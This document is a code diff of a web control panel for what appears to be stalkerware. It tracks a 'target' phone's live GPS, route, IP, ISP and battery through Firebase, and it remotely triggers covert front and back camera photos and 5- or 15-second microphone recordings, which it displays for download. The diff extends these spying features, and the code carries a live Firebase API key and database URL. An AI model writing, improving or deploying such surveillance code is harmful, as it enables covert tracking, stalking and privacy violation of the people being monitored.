-                    <div class="route-card">
-                        <div class="r-val" id="pointsUI">0</div>
-                        <div class="r-lbl">Points</div>
-                    </div>
-                </div>
-                <div class="speed-bar-wrap">
-                    <div style="font-size:11px; color:var(--muted); margin-top:10px;">Speed Meter</div>
-                    <div class="speed-bar-track"><div class="speed-bar-fill" id="speedBarFill"></div></div>
-                </div>
+        <!-- Route History -->
+        <div class="section">
+            <div class="section-title">🗺 Route Log</div>
+            <div class="route-log" id="routeLog">
+                <div style="font-size:11px;color:var(--muted);text-align:center;padding:8px 0;">No route data yet</div>
             </div>
+            <button class="action-btn btn-clear-route full" style="margin-top:8px;font-size:11px;padding:7px;" id="clearRouteBtn">🗑 Clear Route</button>
+        </div>
 
-            <!-- Commands -->
-            <div class="section">
-                <div class="section-title">🎮 Remote Commands</div>
-                <div class="btn-grid">
-                    <button class="action-btn btn-ring" id="ringBtn">🔔 Ring</button>
-                    <button class="action-btn btn-audio" id="audioBtn">🎙️ Voice 5s</button>
-                    <button class="action-btn btn-front" id="photoFrontBtn">📸 Front Cam</button>
-                    <button class="action-btn btn-back" id="photoBackBtn">📸 Back Cam</button>
-                    <button class="action-btn btn-geo full" id="geoBtn">🛡️ Geofence: OFF</button>
-                </div>
+        <!-- Remote Commands -->
+        <div class="section">
+            <div class="section-title">🎮 Remote Commands</div>
+            <div class="btn-grid">
+                <button class="action-btn btn-ring" id="ringBtn">🔔 Ring Alert</button>
+                <button class="action-btn btn-audio" id="audioBtn">🎙 Voice 5s</button>
+                <button class="action-btn btn-front" id="photoFrontBtn">📸 Front Cam</button>
+                <button class="action-btn btn-back" id="photoBackBtn">📸 Back Cam</button>
+                <button class="action-btn btn-audio-long full" id="audioLongBtn">🎙 Voice 15s (Extended)</button>
+                <button class="action-btn btn-geo full" id="geoBtn">🛡 Geofence: OFF</button>
             </div>
+        </div>
 
-            <!-- Photo -->
-            <div class="media-section" id="photoBox">
-                <div class="media-label">
-                    📷 Photo Capture
-                    <span class="media-badge badge-waiting" id="photoBadge">Waiting</span>
-                </div>
-                <img class="spy-img" id="spyImg" src="" alt="Captured photo">
-                <div class="media-actions" id="photoActions" style="display:none;">
-                    <a class="btn-dl" id="downloadPhoto" download="capture.jpg">💾 Download</a>
-                    <button class="btn-del" id="deletePhoto">🗑️ Delete</button>
-                </div>
+        <!-- Photo Box -->
+        <div class="media-section" id="photoBox">
+            <div class="media-header">
+                <span class="media-title">📷 Photo</span>
+                <span class="media-badge badge-wait" id="photoBadge">Waiting</span>
             </div>
-
-            <!-- Audio -->
-            <div class="media-section" id="audioBox">
-                <div class="media-label">
-                    🎙️ Voice Recording
-                    <span class="media-badge badge-waiting" id="audioBadge">Waiting</span>
-                </div>
-                <audio class="spy-audio" id="spyAudio" controls></audio>
-                <div class="media-actions" id="audioActions" style="display:none;">
-                    <a class="btn-dl" id="downloadAudio" download="voice.webm">💾 Download</a>
-                    <button class="btn-del" id="deleteAudio">🗑️ Delete</button>
-                </div>
+            <img class="spy-img" id="spyImg" src="" alt="">
+            <div class="media-btns" id="photoActions" style="display:none;">
+                <a class="m-dl" id="downloadPhoto" download="photo.jpg">💾 Save</a>
+                <button class="m-del" id="deletePhoto">🗑 Delete</button>
             </div>
+        </div>
 
-            <!-- Coords (raw) -->
-            <div class="section">
-                <div class="section-title">🌐 Coordinates</div>
-                <div class="info-grid">
-                    <div class="info-row">
-                        <span class="info-label">Latitude</span>
-                        <span class="info-value highlight" id="latUI">--</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Longitude</span>
-                        <span class="info-value highlight" id="lngUI">--</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Open in Maps</span>
-                        <a id="mapsLink" href="#" target="_blank" style="font-size:12px; color:var(--accent); text-decoration:none; font-weight:600;">Google Maps ↗</a>
-                    </div>
-                </div>
+        <!-- Audio Box -->
+        <div class="media-section" id="audioBox">
+            <div class="media-header">
+                <span class="media-title">🎙 Voice</span>
+                <span class="media-badge badge-wait" id="audioBadge">Waiting</span>
             </div>
+            <audio class="spy-audio" id="spyAudio" controls></audio>
+            <div class="media-btns" id="audioActions" style="display:none;">
+                <a class="m-dl" id="downloadAudio" download="voice.webm">💾 Save</a>
+                <button class="m-del" id="deleteAudio">🗑 Delete</button>
+            </div>
+        </div>
 
-        </div><!-- end panel-body -->
-    </div><!-- end panel -->
+    </div><!-- end panel-body -->
+</div><!-- end panel -->
 
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-        import { getDatabase, ref, onValue, set, remove } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+    import { getDatabase, ref, onValue, set, remove, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
-        // ─── Firebase Init ──────────────────────────────────────────────
-        const firebaseConfig = {
-            apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
-            authDomain: "arng-805db.firebaseapp.com",
-            projectId: "arng-805db",
-            databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/"
-        };
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+    const firebaseConfig = {
+        apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
+        authDomain: "arng-805db.firebaseapp.com",
+        projectId: "arng-805db",
+        databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/"
+    };
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
 
-        // ─── Map Setup ──────────────────────────────────────────────────
-        const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', {
-            maxZoom: 20, subdomains: ['mt0','mt1','mt2','mt3'], attribution: '© Google'
-        });
-        const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            maxZoom: 19, attribution: '© OpenStreetMap'
-        });
-        const terrainLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=p&x={x}&y={y}&z={z}', {
-            maxZoom: 20, subdomains: ['mt0','mt1','mt2','mt3'], attribution: '© Google'
-        });
+    // ─── Map Setup ────────────────────────────────────────────────
+    const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', {
+        maxZoom: 20, subdomains: ['mt0','mt1','mt2','mt3'], attribution: '© Google'
+    });
+    const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        maxZoom: 19, attribution: '© OpenStreetMap'
+    });
+    const terrainLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=p&x={x}&y={y}&z={z}', {
+        maxZoom: 20, subdomains: ['mt0','mt1','mt2','mt3'], attribution: '© Google'
+    });
+    const map = L.map('map', { layers: [satLayer], zoomControl: false }).setView([23.8103, 90.4125], 6);
+    L.control.zoom({ position: 'bottomright' }).addTo(map);
+    L.control.layers({
+        '🛰 Satellite': satLayer,
+        '🗺 Street': streetLayer,
+        '🌿 Terrain': terrainLayer
+    }, {}, { position: 'topright' }).addTo(map);
 
-        const map = L.map('map', { layers: [satLayer], zoomControl: false }).setView([23.8103, 90.4125], 6);
-        L.control.zoom({ position: 'bottomright' }).addTo(map);
-        L.control.layers({
-            "🛰 Satellite": satLayer,
-            "🗺 Street": streetLayer,
-            "🌿 Terrain": terrainLayer
-        }, {}, { position: 'topright' }).addTo(map);
+    // ─── State ────────────────────────────────────────────────────
+    let marker = null, accuracyCircle = null;
+    let routeLine = L.polyline([], { color: '#f43f5e', weight: 3, opacity: 0.85, dashArray: '5,4' }).addTo(map);
+    let routePoints = 0, routeHistory = [];
+    let lastLat = 0, lastLng = 0;
+    let geofenceOn = false, geofenceCircle = null, geofenceCenter = null;
+    let lastSeenTimer = null;
+    let geoAlertShown = false;
+    let confirmCallback = null;
 
-        // ─── State Variables ────────────────────────────────────────────
-        let marker = null;
-        let accuracyCircle = null;
-        let routePoints = 0;
-        let routeLine = L.polyline([], { color: '#f43f5e', weight: 3, opacity: 0.9, dashArray: '6,4' }).addTo(map);
-        let lastLat = 0, lastLng = 0;
-        let geofenceEnabled = false, geofenceCircle = null, geofenceCenter = null;
-        let panelVisible = true;
+    // ─── Panel Toggle ─────────────────────────────────────────────
+    window.togglePanel = (show) => {
+        document.getElementById('mainPanel').classList.toggle('hidden', !show);
+        document.getElementById('showPanelBtn').style.display = show ? 'none' : 'block';
+        if (show) map.invalidateSize();
+    };
 
-        // ─── Panel Toggle ───────────────────────────────────────────────
-        window.togglePanel = function(show) {
-            panelVisible = show;
-            const panel = document.getElementById('mainPanel');
-            const showBtn = document.getElementById('showPanelBtn');
-            if (show) {
-                panel.classList.remove('hidden');
-                showBtn.style.display = 'none';
-            } else {
-                panel.classList.add('hidden');
-                showBtn.style.display = 'block';
-            }
-        };
+    // ─── Toast ────────────────────────────────────────────────────
+    function toast(msg, type = 'info', ms = 3200) {
+        const el = document.getElementById('toast');
+        el.textContent = msg;
+        el.className = type;
+        el.style.display = 'block';
+        clearTimeout(el._t);
+        el._t = setTimeout(() => el.style.display = 'none', ms);
+    }
 
-        // ─── Toast ─────────────────────────────────────────────────────
-        function showToast(msg, type = 'info', duration = 3000) {
-            const toast = document.getElementById('toast');
-            toast.textContent = msg;
-            toast.className = type;
-            toast.style.display = 'block';
-            clearTimeout(toast._timer);
-            toast._timer = setTimeout(() => { toast.style.display = 'none'; }, duration);
-        }
+    // ─── Confirm Dialog ───────────────────────────────────────────
+    window.closeConfirm = () => {
+        document.getElementById('confirmDialog').style.display = 'none';
+        document.getElementById('overlay').classList.remove('show');
+        confirmCallback = null;
+    };
+    function showConfirm(msg, cb) {
+        document.getElementById('confirmMsg').textContent = msg;
+        confirmCallback = cb;
+        document.getElementById('confirmDialog').style.display = 'block';
+        document.getElementById('overlay').classList.add('show');
+    }
+    document.getElementById('confirmYes').addEventListener('click', () => {
+        if (confirmCallback) confirmCallback();
+        closeConfirm();
+    });
+    document.getElementById('overlay').addEventListener('click', closeConfirm);
 
-        // ─── Last Seen Time ─────────────────────────────────────────────
-        function timeAgo(ts) {
-            const diff = Math.floor((Date.now() - ts) / 1000);
-            if (diff < 10) return 'Just now';
-            if (diff < 60) return `${diff}s ago`;
-            if (diff < 3600) return `${Math.floor(diff/60)}m ago`;
-            return `${Math.floor(diff/3600)}h ago`;
-        }
+    // ─── Geofence Alert ───────────────────────────────────────────
+    window.closeGeoAlert = () => {
+        document.getElementById('geoAlert').style.display = 'none';
+        geoAlertShown = false;
+    };
 
-        // ─── Address Lookup ─────────────────────────────────────────────
-        let lastAddrFetch = 0;
-        function fetchAddress(lat, lng) {
-            const now = Date.now();
-            if (now - lastAddrFetch < 10000) return; // throttle
-            lastAddrFetch = now;
-            fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`)
-                .then(r => r.json())
-                .then(d => { document.getElementById('addressUI').textContent = d.display_name || 'Unknown location'; })
-                .catch(() => {});
-        }
+    // ─── Time Ago ─────────────────────────────────────────────────
+    function timeAgo(ts) {
+        const s = Math.floor((Date.now() - ts) / 1000);
+        if (s < 10) return 'Now';
+        if (s < 60) return `${s}s ago`;
+        if (s < 3600) return `${Math.floor(s/60)}m ago`;
+        return `${Math.floor(s/3600)}h ago`;
+    }
 
-        // ─── Init: Clear stale media ────────────────────────────────────
-        remove(ref(db, 'live_location/photo'));
-        remove(ref(db, 'live_location/audio'));
+    // ─── Address Fetch ────────────────────────────────────────────
+    let lastAddrTs = 0;
+    async function fetchAddress(lat, lng) {
+        const now = Date.now();
+        if (now - lastAddrTs < 12000) return;
+        lastAddrTs = now;
+        try {
+            const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&accept-language=bn,en`);
+            const d = await r.json();
+            const addr = d.display_name || 'Unknown location';
+            document.getElementById('addressUI').textContent = addr;
+            document.getElementById('addressBox').className = 'address-box';
+            // Add to route log
+            addRouteLog(lat, lng, addr.split(',')[0]);
+        } catch {}
+    }
 
-        // ─── Ring Button ────────────────────────────────────────────────
-        document.getElementById('ringBtn').addEventListener('click', () => {
-            set(ref(db, 'live_location/command'), { ringTime: Date.now() });
-            showToast('🔔 Ring command sent!', 'success');
-        });
+    // ─── Route Log ────────────────────────────────────────────────
+    function addRouteLog(lat, lng, label) {
+        const log = document.getElementById('routeLog');
+        const time = new Date().toLocaleTimeString('en-US', { hour:'2-digit', minute:'2-digit', second:'2-digit' });
+        routeHistory.push({ lat, lng, label, time });
+        if (log.children[0]?.style?.textAlign === 'center') log.innerHTML = '';
+        const item = document.createElement('div');
+        item.className = 'route-log-item';
+        item.innerHTML = `<span>${label || `${lat.toFixed(4)}, ${lng.toFixed(4)}`}</span><span>${time}</span>`;
+        log.insertBefore(item, log.firstChild);
+        // Keep max 20 items
+        while (log.children.length > 20) log.removeChild(log.lastChild);
+    }
 
-        // ─── Photo Buttons ──────────────────────────────────────────────
-        function reqPhoto(camType) {
-            set(ref(db, 'live_location/command'), { photoTime: Date.now(), camType });
-            const box = document.getElementById('photoBox');
-            box.classList.add('visible');
-            document.getElementById('photoBadge').textContent = 'Requesting...';
-            document.getElementById('photoBadge').className = 'media-badge badge-waiting';
-            document.getElementById('spyImg').className = 'spy-img';
-            document.getElementById('photoActions').style.display = 'none';
-            showToast(`📸 ${camType === 'user' ? 'Front' : 'Back'} camera requested...`, 'info');
-        }
-        document.getElementById('photoFrontBtn').addEventListener('click', () => reqPhoto('user'));
-        document.getElementById('photoBackBtn').addEventListener('click', () => reqPhoto('environment'));
+    // ─── Clear Stale Media on Load ────────────────────────────────
+    remove(ref(db, 'live_location/photo'));
+    remove(ref(db, 'live_location/audio'));
 
-        // ─── Audio Button ───────────────────────────────────────────────
-        document.getElementById('audioBtn').addEventListener('click', () => {
-            set(ref(db, 'live_location/command'), { audioTime: Date.now() });
-            const box = document.getElementById('audioBox');
-            box.classList.add('visible');
-            document.getElementById('audioBadge').textContent = 'Recording 5s...';
-            document.getElementById('audioBadge').className = 'media-badge badge-waiting';
-            document.getElementById('spyAudio').className = 'spy-audio';
-            document.getElementById('audioActions').style.display = 'none';
-            showToast('🎙️ Voice recording requested!', 'info');
-        });
+    // ─── Ring Button ──────────────────────────────────────────────
+    document.getElementById('ringBtn').addEventListener('click', () => {
+        set(ref(db, 'live_location/command'), { ringTime: Date.now() });
+        toast('🔔 Ring পাঠানো হয়েছে!', 'success');
+    });
 
-        // ─── Delete Buttons ─────────────────────────────────────────────
-        document.getElementById('deletePhoto').addEventListener('click', () => {
+    // ─── Photo Buttons ────────────────────────────────────────────
+    function requestPhoto(camType) {
+        set(ref(db, 'live_location/command'), { photoTime: Date.now(), camType });
+        document.getElementById('photoBox').classList.add('visible');
+        document.getElementById('photoBadge').textContent = 'Requesting...';
+        document.getElementById('photoBadge').className = 'media-badge badge-wait';
+        document.getElementById('spyImg').className = 'spy-img';
+        document.getElementById('photoActions').style.display = 'none';
+        toast(`📸 ${camType === 'user' ? 'Front' : 'Back'} camera request পাঠানো হয়েছে...`, 'info');
+    }
+    document.getElementById('photoFrontBtn').addEventListener('click', () => requestPhoto('user'));
+    document.getElementById('photoBackBtn').addEventListener('click', () => requestPhoto('environment'));
+
+    // ─── Audio Buttons ────────────────────────────────────────────
+    function requestAudio(duration = 5000) {
+        set(ref(db, 'live_location/command'), { audioTime: Date.now(), audioDuration: duration });
+        document.getElementById('audioBox').classList.add('visible');
+        document.getElementById('audioBadge').textContent = `Recording ${duration/1000}s...`;
+        document.getElementById('audioBadge').className = 'media-badge badge-wait';
+        document.getElementById('spyAudio').className = 'spy-audio';
+        document.getElementById('audioActions').style.display = 'none';
+        toast(`🎙 ${duration/1000}s recording request পাঠানো হয়েছে!`, 'info');
+    }
+    document.getElementById('audioBtn').addEventListener('click', () => requestAudio(5000));
+    document.getElementById('audioLongBtn').addEventListener('click', () => requestAudio(15000));
+
+    // ─── Delete Buttons ───────────────────────────────────────────
+    document.getElementById('deletePhoto').addEventListener('click', () => {
+        showConfirm('Photo Firebase থেকে মুছে ফেলবো?', () => {
             remove(ref(db, 'live_location/photo'));
             document.getElementById('photoBox').classList.remove('visible');
-            showToast('🗑️ Photo deleted.', 'success');
+            toast('🗑 Photo মুছা হয়েছে।', 'success');
         });
-        document.getElementById('deleteAudio').addEventListener('click', () => {
+    });
+    document.getElementById('deleteAudio').addEventListener('click', () => {
+        showConfirm('Audio Firebase থেকে মুছে ফেলবো?', () => {
             remove(ref(db, 'live_location/audio'));
             document.getElementById('audioBox').classList.remove('visible');
-            showToast('🗑️ Audio deleted.', 'success');
+            toast('🗑 Audio মুছা হয়েছে।', 'success');
         });
+    });
 
-        // ─── Geofence Button ────────────────────────────────────────────
-        document.getElementById('geoBtn').addEventListener('click', () => {
-            geofenceEnabled = !geofenceEnabled;
-            const btn = document.getElementById('geoBtn');
-            if (geofenceEnabled && lastLat !== 0) {
-                geofenceCenter = [lastLat, lastLng];
-                geofenceCircle = L.circle(geofenceCenter, {
-                    radius: 200,
-                    color: '#f59e0b',
-                    fillColor: '#f59e0b',
-                    fillOpacity: 0.08,
-                    weight: 2,
-                    dashArray: '8,4'
-                }).addTo(map);
-                btn.textContent = '🛡️ Geofence: ON (200m)';
-                btn.classList.add('active');
-                showToast('🛡️ Geofence enabled at current location (200m radius)', 'success');
-            } else {
-                if (geofenceCircle) { map.removeLayer(geofenceCircle); geofenceCircle = null; }
-                btn.textContent = '🛡️ Geofence: OFF';
-                btn.classList.remove('active');
-                if (!geofenceEnabled) showToast('Geofence disabled', 'info');
-                else { geofenceEnabled = false; showToast('⚠️ No GPS fix yet. Get GPS data first.', 'error'); }
-            }
+    // ─── Clear Route ──────────────────────────────────────────────
+    document.getElementById('clearRouteBtn').addEventListener('click', () => {
+        showConfirm('Route history মুছে ফেলবো?', () => {
+            routeLine.setLatLngs([]);
+            routePoints = 0;
+            routeHistory = [];
+            document.getElementById('pointsUI').textContent = '0';
+            document.getElementById('routeLog').innerHTML = '<div style="font-size:11px;color:var(--muted);text-align:center;padding:8px 0;">No route data yet</div>';
+            toast('Route cleared.', 'info');
         });
+    });
 
-        // ─── Photo Listener ──────────────────────────────────────────────
-        onValue(ref(db, 'live_location/photo'), (snap) => {
-            const data = snap.val();
-            if (!data) return;
-            const box = document.getElementById('photoBox');
-            box.classList.add('visible');
-            if (data.image) {
-                document.getElementById('photoBadge').textContent = '✓ Captured';
-                document.getElementById('photoBadge').className = 'media-badge badge-ok';
-                const img = document.getElementById('spyImg');
-                img.src = data.image;
-                img.className = 'spy-img visible';
-                document.getElementById('downloadPhoto').href = data.image;
-                document.getElementById('photoActions').style.display = 'flex';
-                showToast('📸 Photo received!', 'success');
-            } else if (data.error) {
-                document.getElementById('photoBadge').textContent = '✗ Error';
-                document.getElementById('photoBadge').className = 'media-badge badge-err';
-                showToast(`⚠️ ${data.error}`, 'error');
-            }
-        });
-
-        // ─── Audio Listener ──────────────────────────────────────────────
-        onValue(ref(db, 'live_location/audio'), (snap) => {
-            const data = snap.val();
-            if (!data) return;
-            const box = document.getElementById('audioBox');
-            box.classList.add('visible');
-            if (data.file) {
-                document.getElementById('audioBadge').textContent = '✓ Received';
-                document.getElementById('audioBadge').className = 'media-badge badge-ok';
-                const audio = document.getElementById('spyAudio');
-                audio.src = data.file;
-                audio.className = 'spy-audio visible';
-                document.getElementById('downloadAudio').href = data.file;
-                document.getElementById('audioActions').style.display = 'flex';
-                showToast('🎙️ Voice recording received!', 'success');
-            } else if (data.error) {
-                document.getElementById('audioBadge').textContent = '✗ Error';
-                document.getElementById('audioBadge').className = 'media-badge badge-err';
-                showToast(`⚠️ ${data.error}`, 'error');
-            }
-        });
-
-        // ─── Main Location Listener ──────────────────────────────────────
-        let lastSeenInterval = null;
-
-        onValue(ref(db, 'live_location/target_user'), (snapshot) => {
-            const data = snapshot.val();
-
-            if (!data || !data.isOnline) {
-                // Offline
-                document.getElementById('statusDot').className = 'status-dot offline';
-                document.getElementById('statusText').textContent = 'Offline';
-                document.getElementById('statusText').className = 'status-text offline';
+    // ─── Geofence Button ─────────────────────────────────────────
+    document.getElementById('geoBtn').addEventListener('click', () => {
+        geofenceOn = !geofenceOn;
+        const btn = document.getElementById('geoBtn');
+        if (geofenceOn) {
+            if (lastLat === 0) {
+                geofenceOn = false;
+                toast('⚠️ আগে GPS data আসতে দিন!', 'error');
                 return;
             }
+            geofenceCenter = [lastLat, lastLng];
+            geofenceCircle = L.circle(geofenceCenter, {
+                radius: 200, color: '#f59e0b', fillColor: '#f59e0b',
+                fillOpacity: 0.07, weight: 2, dashArray: '8,5'
+            }).addTo(map);
+            btn.textContent = '🛡 Geofence: ON (200m)';
+            btn.classList.add('on');
+            geoAlertShown = false;
+            toast('🛡 Geofence চালু — ২০০মিটার radius', 'success');
+        } else {
+            if (geofenceCircle) { map.removeLayer(geofenceCircle); geofenceCircle = null; }
+            btn.textContent = '🛡 Geofence: OFF';
+            btn.classList.remove('on');
+            toast('Geofence বন্ধ।', 'info');
+        }
+    });
 
-            // Online
-            document.getElementById('statusDot').className = 'status-dot live';
-            document.getElementById('statusText').textContent = 'Live';
-            document.getElementById('statusText').className = 'status-text live';
+    // ─── Photo Listener ───────────────────────────────────────────
+    onValue(ref(db, 'live_location/photo'), (snap) => {
+        const d = snap.val();
+        if (!d) return;
+        document.getElementById('photoBox').classList.add('visible');
+        if (d.image) {
+            document.getElementById('photoBadge').textContent = '✓ Got it!';
+            document.getElementById('photoBadge').className = 'media-badge badge-ok';
+            const img = document.getElementById('spyImg');
+            img.src = d.image; img.className = 'spy-img show';
+            document.getElementById('downloadPhoto').href = d.image;
+            document.getElementById('photoActions').style.display = 'flex';
+            toast('📸 Photo পাওয়া গেছে!', 'success');
+        } else if (d.error) {
+            document.getElementById('photoBadge').textContent = '✗ Error';
+            document.getElementById('photoBadge').className = 'media-badge badge-err';
+            toast(`⚠️ ${d.error}`, 'error', 5000);
+        }
+    });
 
-            // Last seen
-            if (data.lastSeen) {
-                clearInterval(lastSeenInterval);
-                const updateTime = () => document.getElementById('lastSeenTime').textContent = timeAgo(data.lastSeen);
-                updateTime();
-                lastSeenInterval = setInterval(updateTime, 10000);
+    // ─── Audio Listener ───────────────────────────────────────────
+    onValue(ref(db, 'live_location/audio'), (snap) => {
+        const d = snap.val();
+        if (!d) return;
+        document.getElementById('audioBox').classList.add('visible');
+        if (d.file) {
+            document.getElementById('audioBadge').textContent = '✓ Received!';
+            document.getElementById('audioBadge').className = 'media-badge badge-ok';
+            const audio = document.getElementById('spyAudio');
+            audio.src = d.file; audio.className = 'spy-audio show';
+            document.getElementById('downloadAudio').href = d.file;
+            document.getElementById('audioActions').style.display = 'flex';
+            toast('🎙 Voice recording পাওয়া গেছে!', 'success');
+        } else if (d.error) {
+            document.getElementById('audioBadge').textContent = '✗ Error';
+            document.getElementById('audioBadge').className = 'media-badge badge-err';
+            toast(`⚠️ ${d.error}`, 'error', 5000);
+        }
+    });
+
+    // ─── Main Location Listener ───────────────────────────────────
+    onValue(ref(db, 'live_location/target_user'), (snap) => {
+        const data = snap.val();
+
+        if (!data || !data.isOnline) {
+            document.getElementById('statusDot').className = 'status-dot offline';
+            document.getElementById('statusText').className = 'status-text offline';
+            document.getElementById('statusText').textContent = 'Offline';
+            document.getElementById('mapHud').style.display = 'none';
+            return;
+        }
+
+        // ── Online ──
+        document.getElementById('statusDot').className = 'status-dot live';
+        document.getElementById('statusText').className = 'status-text live';
+        document.getElementById('statusText').textContent = 'Live ●';
+        document.getElementById('mapHud').style.display = 'flex';
+
+        // Last seen timer
+        if (data.lastSeen) {
+            clearInterval(lastSeenTimer);
+            const updateTS = () => document.getElementById('lastSeenTime').textContent = timeAgo(data.lastSeen);
+            updateTS();
+            lastSeenTimer = setInterval(updateTS, 5000);
+        }
+
+        // Device Info
+        document.getElementById('deviceUI').textContent = data.deviceInfo || '--';
+        const batText = data.battery != null
+            ? `${data.battery}% ${data.charging ? '⚡ Charging' : '🔋'}` : '--';
+        document.getElementById('batUI').textContent = batText;
+        document.getElementById('hudBat').textContent = data.battery ? `${data.battery}%` : '--';
+
+        // IP & ISP — clean display
+        const ip = data.ip_address || '--';
+        const isp = data.isp || '--';
+        document.getElementById('ipUI').textContent = ip;
+        document.getElementById('ispUI').textContent = isp;
+        document.getElementById('hudIp').textContent = ip;
+
+        // GPS Error check
+        if (data.status && (data.status.includes('Error') || data.status.includes('Denied') || data.status.includes('Lost'))) {
+            const box = document.getElementById('addressBox');
+            box.querySelector('#addressUI').textContent = `⚠️ ${data.status}`;
+            box.className = 'address-box error';
+            return;
+        }
+
+        const { latitude: lat, longitude: lng, accuracy, speed, heading } = data;
+        if (!lat || !lng) return;
+
+        // Coords
+        document.getElementById('latUI').textContent = lat.toFixed(6);
+        document.getElementById('lngUI').textContent = lng.toFixed(6);
+        document.getElementById('accUI').textContent = accuracy ? `±${Math.round(accuracy)}m` : '--';
+        document.getElementById('speedUI').textContent = speed || 0;
+        document.getElementById('headingUI').textContent = `${Math.round(heading || 0)}°`;
+        document.getElementById('speedFill').style.width = `${Math.min((speed / 120) * 100, 100)}%`;
+        document.getElementById('hudSpeed').textContent = `${speed || 0} km/h`;
+        document.getElementById('mapsLink').href = `https://maps.google.com/?q=${lat},${lng}`;
+
+        // Address fetch when moved
+        if (Math.abs(lat - lastLat) > 0.00010 || lastLat === 0) {
+            fetchAddress(lat, lng);
+        }
+        lastLat = lat; lastLng = lng;
+
+        // Route line
+        routeLine.addLatLng([lat, lng]);
+        routePoints++;
+        document.getElementById('pointsUI').textContent = routePoints;
+
+        // Marker icon
+        const emoji = speed > 50 ? '🚗' : speed > 10 ? '🛵' : speed > 2 ? '🚶' : '🧍';
+        const iconHtml = `<div class="smart-marker" style="transform:rotate(${heading||0}deg)">${emoji}</div>`;
+        const icon = L.divIcon({ className: '', html: iconHtml, iconSize: [40,40], iconAnchor: [20,20] });
+        const latlng = [lat, lng];
+
+        if (!marker) {
+            accuracyCircle = L.circle(latlng, {
+                radius: accuracy || 50, color: '#38bdf8', fillColor: '#38bdf8',
+                fillOpacity: 0.1, weight: 1
+            }).addTo(map);
+            marker = L.marker(latlng, { icon }).addTo(map);
+            map.flyTo(latlng, 17, { duration: 2.5 });
+        } else {
+            marker.setLatLng(latlng).setIcon(icon);
+            if (accuracyCircle) accuracyCircle.setLatLng(latlng).setRadius(accuracy || 50);
+        }
+
+        // Geofence check
+        if (geofenceOn && geofenceCenter && !geoAlertShown) {
+            const dist = map.distance(latlng, geofenceCenter);
+            if (dist > 200) {
+                geoAlertShown = true;
+                document.getElementById('geoAlert').style.display = 'block';
+                document.getElementById('geoAlertMsg').textContent =
+                    `Target is ${Math.round(dist)}m from the safe zone boundary!`;
+                // Also send ring alarm
+                set(ref(db, 'live_location/command'), { ringTime: Date.now() });
             }
-
-            // Device info
-            document.getElementById('deviceUI').textContent = data.deviceInfo || '--';
-            document.getElementById('batUI').textContent = data.battery != null
-                ? `${data.battery}% ${data.charging ? '⚡ Charging' : '🔋'}` : '--';
-            document.getElementById('ipUI').textContent = data.ip_address || '--';
-            document.getElementById('ispUI').textContent = data.isp || '--';
-
-            if (data.status && data.status.includes('Error')) {
-                document.getElementById('addressUI').textContent = `⚠️ ${data.status}`;
-                return;
-            }
-
-            const { latitude: lat, longitude: lng, accuracy, speed, heading } = data;
-            if (!lat || !lng) return;
-
-            // Update coords
-            document.getElementById('latUI').textContent = lat.toFixed(6);
-            document.getElementById('lngUI').textContent = lng.toFixed(6);
-            document.getElementById('accUI').textContent = accuracy ? `±${Math.round(accuracy)}m` : '--';
-            document.getElementById('speedUI').textContent = speed || 0;
-            document.getElementById('headingUI').textContent = `${heading || 0}°`;
-            document.getElementById('mapsLink').href = `https://maps.google.com/?q=${lat},${lng}`;
-
-            // Speed bar (max 120 km/h)
-            document.getElementById('speedBarFill').style.width = `${Math.min((speed / 120) * 100, 100)}%`;
-
-            // Route
-            if (Math.abs(lastLat - lat) > 0.00005 || lastLat === 0) {
-                if (lastLat !== 0) fetchAddress(lat, lng);
-                routeLine.addLatLng([lat, lng]);
-                routePoints++;
-                document.getElementById('pointsUI').textContent = routePoints;
-            }
-            lastLat = lat; lastLng = lng;
-
-            // Update marker
-            const emoji = speed > 30 ? '🚗' : (speed > 5 ? '🚶' : '🧍');
-            const iconHtml = `<div class="smart-marker" style="transform:rotate(${heading||0}deg)">${emoji}</div>`;
-            const smartIcon = L.divIcon({ className: '', html: iconHtml, iconSize: [40, 40], iconAnchor: [20, 20] });
-            const latlng = [lat, lng];
-
-            if (!marker) {
-                accuracyCircle = L.circle(latlng, {
-                    radius: accuracy || 50,
-                    color: '#38bdf8',
-                    fillColor: '#38bdf8',
-                    fillOpacity: 0.1,
-                    weight: 1
-                }).addTo(map);
-                marker = L.marker(latlng, { icon: smartIcon }).addTo(map);
-                map.flyTo(latlng, 17, { duration: 2 });
-            } else {
-                marker.setLatLng(latlng);
-                marker.setIcon(smartIcon);
-                if (accuracyCircle) { accuracyCircle.setLatLng(latlng); accuracyCircle.setRadius(accuracy || 50); }
-            }
-
-            // Geofence check
-            if (geofenceEnabled && geofenceCenter) {
-                const dist = map.distance(latlng, geofenceCenter);
-                if (dist > 200) {
-                    document.getElementById('geoAlert').style.display = 'block';
-                    document.getElementById('geoAlertMsg').textContent =
-                        `Target is ${Math.round(dist)}m away from geofence boundary!`;
-                }
-            }
-        });
-    </script>
+        }
+    });
+</script>
